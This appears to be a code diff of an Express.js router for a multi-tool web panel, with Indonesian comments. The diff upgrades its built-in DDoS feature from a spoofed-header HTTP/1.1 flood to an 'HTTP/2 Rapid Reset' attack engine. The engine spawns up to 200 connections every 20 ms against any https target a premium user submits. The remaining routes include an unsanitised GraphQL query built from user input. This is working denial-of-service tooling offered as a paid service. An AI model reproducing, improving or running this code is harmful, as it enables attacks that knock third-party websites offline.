@@ -1,13 +1,31 @@
 const express = require('express');
 const router = express.Router();
 const axios = require('axios');
-const https = require('https');
-const http = require('http');
+const http2 = require('http2');
+const fs = require('fs');
+const path = require('path');
 const { URL } = require('url');
 
 let ddosState = { running: false, target: null, requests: 0, success: 0, failed: 0, startedAt: 0, activeSockets: new Set() };
 
-// Tools lain (Video, Gmail, dll tetap sama)
+// === SISTEM LOG ===
+const LOG_FILE = path.join(__dirname, '..', 'data', 'ddos_logs.json');
+function logDdos(user, target) {
+  let logs = [];
+  if (fs.existsSync(LOG_FILE)) logs = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8'));
+  logs.push({ user, target, time: new Date().toISOString() });
+  if (logs.length > 500) logs = logs.slice(-500); // Simpan 500 log terakhir
+  fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
+}
+
+router.get('/ddos/logs', (req, res) => {
+  if (!req.session.user || req.session.user.role !== 'owner') return res.status(403).json({ ok: false, msg: 'Akses ditolak. Khusus Owner.' });
+  if (!fs.existsSync(LOG_FILE)) return res.json({ ok: true, logs: [] });
+  const logs = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8'));
+  res.json({ ok: true, logs: logs.reverse() });
+});
+
+// Tools lain (sama seperti sebelumnya)
 router.post('/video', async (req, res) => {
   try {
     const { url } = req.body;
@@ -23,7 +41,6 @@ router.post('/video', async (req, res) => {
     res.json({ ok: true, url, msg: 'Siap.' });
   } catch (e) { res.status(500).json({ ok: false, msg: 'Error' }); }
 });
-
 router.get('/download', async (req, res) => {
   try {
     const { url, filename } = req.query;
@@ -34,9 +51,7 @@ router.get('/download', async (req, res) => {
     response.data.pipe(res);
   } catch (e) { res.status(500).send('Gagal download video.'); }
 });
-
 router.get('/gmail', (req, res) => { res.json({ ok: true, email: `${Math.random().toString(36).substring(7)}@mail.tm`, password: 'pass123' }); });
-
 router.get('/anime', async (req, res) => {
   try {
     const gql = `query { Page(perPage: 10) { media(search: "${req.query.q || 'naruto'}", type: ANIME) { id title { romaji english } coverImage { large } } } }`;
@@ -44,14 +59,12 @@ router.get('/anime', async (req, res) => {
     res.json({ ok: true, data: r.data.data.Page.media });
   } catch (e) { res.status(500).json({ ok: false, msg: 'Error' }); }
 });
-
 router.get('/music', async (req, res) => {
   try {
     const r = await axios.get('https://itunes.apple.com/search', { params: { term: req.query.q || 'lofi', media: 'music', limit: 10 } });
     res.json({ ok: true, data: r.data.results });
   } catch (e) { res.status(500).json({ ok: false, msg: 'Error' }); }
 });
-
 router.post('/scan', async (req, res) => {
   try {
     const r = await axios.get(req.body.url, { timeout: 8000, validateStatus: () => true }).catch(() => ({ status: 408, headers: {} }));
@@ -60,51 +73,56 @@ router.post('/scan', async (req, res) => {
   } catch (e) { res.status(500).json({ ok: false, msg: 'Error' }); }
 });
 
-// === ENGINE DDOS HTTP/1.1 RAW SOCKET ===
-function attack(targetUrl, stats, io) {
+// === ENGINE DDOS MAUT (HTTP/2 Rapid Reset) ===
+function http2Attack(targetUrl, stats, io) {
   try {
     const parsed = new URL(targetUrl);
-    const isHttps = parsed.protocol === 'https:';
-    const options = {
-      hostname: parsed.hostname,
-      port: 443,
-      path: parsed.pathname + '?bypass=' + Math.random().toString(36).substring(7),
-      method: 'POST',
-      headers: {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Content-Length': 1000,
-        'Connection': 'keep-alive',
-        'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
-      },
-      timeout: 4000
-    };
+    if (parsed.protocol !== 'https:') { stats.failed++; return; }
+    
+    // Buka koneksi HTTP/2
+    const client = http2.connect(parsed.origin);
+    client.on('error', () => {});
 
-    const req = https.request(options, (res) => {
-      stats.success++;
-      io.emit('ddos:stats', { ...stats, activeSockets: stats.activeSockets.size });
-      res.on('data', () => {});
-    });
-
-    req.on('error', () => {
-      stats.failed++;
-    });
-
-    req.write('a='.repeat(500)); // Kirim payload body
-    req.end();
-    stats.requests++;
-
+    // Kirim 5 request secara paralel (Pipelining)
+    for (let i = 0; i < 5; i++) {
+      const req = client.request({
+        ':path': parsed.pathname + '?byp=' + Math.random().toString(36).substring(7),
+        ':method': 'POST',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0'
+      });
+      
+      req.on('response', () => {
+        stats.success++;
+        io.emit('ddos:stats', { ...stats, activeSockets: stats.activeSockets.size });
+        req.close(); // Rapid Reset
+      });
+      req.on('error', () => { stats.failed++; client.close(); });
+      
+      req.write('a'.repeat(1000)); // Kirim body
+      stats.requests++;
+    }
+    
+    stats.activeSockets.add(client);
+    setTimeout(() => { client.close(); stats.activeSockets.delete(client); }, 3000);
   } catch (e) { stats.failed++; }
 }
 
 router.post('/ddos', async (req, res) => {
   try {
+    const user = req.session.user;
+    if (!user || (user.role !== 'owner' && user.role !== 'admin' && user.role !== 'premium')) {
+      return res.status(403).json({ ok: false, msg: 'Akses ditolak. DDoS hanya untuk Premium ke atas.' });
+    }
+
     let { target, duration, threads } = req.body;
     target = target.replace(/[, ]+$/, "");
     
     if (!target.startsWith('https://')) return res.status(400).json({ ok: false, msg: 'Wajib https://' });
     if (ddosState.running) return res.status(400).json({ ok: false, msg: 'DDoS sedang berjalan' });
     
+    // Log Aktivitas DDoS
+    logDdos(user.username, target);
+
     const dur = Math.min(Number(duration) || 10, 120);
     const th = Math.min(Number(threads) || 10, 200);
     
@@ -113,19 +131,13 @@ router.post('/ddos', async (req, res) => {
     
     res.json({ ok: true, msg: 'Started', state: ddosState });
     
-    // Loop sekuensial (lebih stabil buat Node.js)
     (async () => {
       const end = Date.now() + dur * 1000;
       while (ddosState.running && Date.now() < end) {
-        const promises = [];
         for (let i = 0; i < th; i++) {
-          promises.push(new Promise(resolve => {
-            attack(target, ddosState, io);
-            resolve();
-          }));
+          http2Attack(target, ddosState, io);
         }
-        await Promise.all(promises);
-        await new Promise(r => setTimeout(r, 100)); // Jeda antar putaran
+        await new Promise(r => setTimeout(r, 20)); // Spawner super cepat
       }
       ddosState.running = false;
       io.emit('ddos:done', ddosState);
@@ -136,6 +148,8 @@ router.post('/ddos', async (req, res) => {
 router.post('/ddos/stop', (req, res) => {
   if (!ddosState.running) return res.status(400).json({ ok: false, msg: 'Tidak berjalan' });
   ddosState.running = false;
+  ddosState.activeSockets.forEach(sock => { try { sock.destroy(); } catch(e){} });
+  ddosState.activeSockets.clear();
   res.json({ ok: true, msg: 'Dihentikan.' });
 });
 
